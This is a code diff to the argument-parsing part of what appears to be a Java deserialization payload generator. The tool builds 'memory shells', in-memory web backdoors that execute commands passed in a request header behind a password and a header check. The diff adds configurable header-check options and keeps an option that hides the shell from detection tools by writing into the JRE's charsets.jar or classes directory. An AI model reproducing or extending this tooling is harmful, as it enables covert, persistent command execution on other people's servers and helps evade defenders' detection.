@@ -36,11 +36,12 @@ public class GeneratePayload {
 		options.addOption("i", "inherit", false, "Make payload inherit AbstractTranslet or not (Lower JDK like 1.6 should inherit)");
 		options.addOption("u", "url", true, "MemoryShell binding url pattern,default [/version.txt]");
 		options.addOption("pw", "password", true, "MemoryShell password,default [p@ssw0rd]");
-		options.addOption("r", "referer", true, "MemoryShell Referer check,default [https://su18.org/]");
+		options.addOption("hk", "header-key", true, "MemoryShell Header Check,Request Header Key,default [Referer]");
+		options.addOption("hv", "header-value", true, "MemoryShell Header Check,Request Header Value,default [https://su18.org/]");
 		options.addOption("ch", "cmd-header", true, "Request Header which pass the command to Execute,default [X-Token-Data]");
 		options.addOption("gen", "gen-mem-shell", false, "Write Memory Shell Class to File");
 		options.addOption("n", "gen-mem-shell-name", true, "Memory Shell Class File Name");
-		options.addOption("h", "hide-mem-shell", false, "Hide memory shell from detection tools by writing file to $JAVA_HOME,only support SpringControllerMS currently");
+		options.addOption("h", "hide-mem-shell", false, "Hide memory shell from detection tools (type 2 only support SpringControllerMS)");
 		options.addOption("ht", "hide-type", true, "Hide memory shell,type 1:write /jre/lib/charsets.jar 2:write /jre/classes/");
 		options.addOption("j", "jboss", false, "Using JBoss ObjectInputStream/ObjectOutputStream");
 		options.addOption("et", "encrypted-transcoder", false, "Encode By EncryptedTranscoder");
@@ -104,8 +105,12 @@ public class GeneratePayload {
 			PASSWORD = generatePassword(cmdLine.getOptionValue("password"));
 		}
 
-		if (cmdLine.hasOption("referer")) {
-			REFERER = cmdLine.getOptionValue("referer");
+		if (cmdLine.hasOption("header-key")) {
+			HEADER_KEY = cmdLine.getOptionValue("header-key");
+		}
+
+		if (cmdLine.hasOption("header-value")) {
+			HEADER_VALUE = cmdLine.getOptionValue("header-value");
 		}
 
 		if (cmdLine.hasOption("no-com-sun")) {
